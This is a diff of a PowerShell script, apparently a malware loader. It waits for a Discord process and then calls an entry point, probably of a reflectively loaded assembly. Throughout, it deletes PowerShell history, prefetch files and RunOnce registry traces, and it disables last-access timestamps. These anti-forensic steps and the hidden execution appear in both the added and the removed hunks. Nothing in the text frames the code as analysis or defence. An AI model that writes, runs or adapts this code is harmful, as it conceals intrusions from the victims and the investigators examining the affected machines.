@@ -11,6 +11,30 @@ Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOn
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 fsutil behavior set disablelastaccess 1
+$timeout = (Get-Date).AddSeconds(60)
+
+while ((Get-Date) -lt $timeout) {
+    if (Get-Process Discord -ErrorAction SilentlyContinue) {
+        break
+    }
+    Start-Sleep 1
+}
+
+if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
+    {
+Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
+Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Clear-History -ErrorAction SilentlyContinue
+Exit
+    }.Invoke()
+}
+
+
+$invokeArgs = New-Object object[] 1
+$invokeArgs[0] = [string[]]@()
+
+$entry.Invoke($null, $invokeArgs)
 
 
 $os = Get-CimInstance Win32_OperatingSystem
@@ -82,30 +106,6 @@ Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyCon
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 
-$timeout = (Get-Date).AddSeconds(60)
-
-while ((Get-Date) -lt $timeout) {
-    if (Get-Process Discord -ErrorAction SilentlyContinue) {
-        break
-    }
-    Start-Sleep 1
-}
-
-if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
-    {
-Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
-Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-Clear-History -ErrorAction SilentlyContinue
-Exit
-    }.Invoke()
-}
-
-
-$invokeArgs = New-Object object[] 1
-$invokeArgs[0] = [string[]]@()
-
-$entry.Invoke($null, $invokeArgs)
 
 
 $services = @(
